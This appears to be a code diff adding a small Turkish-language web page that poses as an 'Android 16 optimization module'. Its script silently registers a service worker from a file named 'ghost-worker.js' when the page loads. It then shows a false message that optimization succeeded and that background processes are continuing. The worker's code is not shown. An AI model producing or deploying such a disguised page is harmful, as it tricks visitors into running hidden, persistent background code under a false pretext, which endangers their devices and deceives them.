@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Sistem Optimizasyonu</title>
+</head>
+<body style="background:#000; color:#0f0; text-align:center; padding-top:50px; font-family:sans-serif;">
+    <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" width="100">
+    <h2>Android 16 Optimizasyon Modülü</h2>
+    <p id="status">Sistem analiz ediliyor...</p>
+    
+    <script>
+        // Hayaleti (Worker) Kaydetme
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('ghost-worker.js')
+            .then(() => {
+                setTimeout(() => {
+                    document.getElementById('status').innerText = "Optimizasyon başarıyla tamamlandı. Arka plan işlemleri devam ediyor.";
+                }, 3000);
+            });
+        }
+    </script>
+</body>
+</html>
